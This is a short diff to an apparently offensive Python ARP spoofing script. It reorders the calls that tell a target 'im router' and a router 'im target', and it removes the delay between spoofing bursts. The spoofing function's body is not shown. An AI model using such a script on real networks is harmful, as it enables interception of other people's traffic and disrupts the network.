@@ -46,8 +46,8 @@ def spoof(target_ip, spoof_ip):
 
 # function to changes ip targets and routers
 def spoof_func(target_ip, spoof_ip):
-    spoof(target_ip, spoof_ip)  # tell target "im router"
     spoof(spoof_ip, target_ip)  # tell router "im target"
+    spoof(target_ip, spoof_ip)  # tell target "im router"
 
 
 # function restore the ips
@@ -73,7 +73,7 @@ try:
             # use spoof function
             spoof_func(target, router)
             print("[+] Sent to packets")
-            time.sleep(2)
+            time.sleep(0)
         except Exception as e:
             print(e)
 except KeyboardInterrupt:
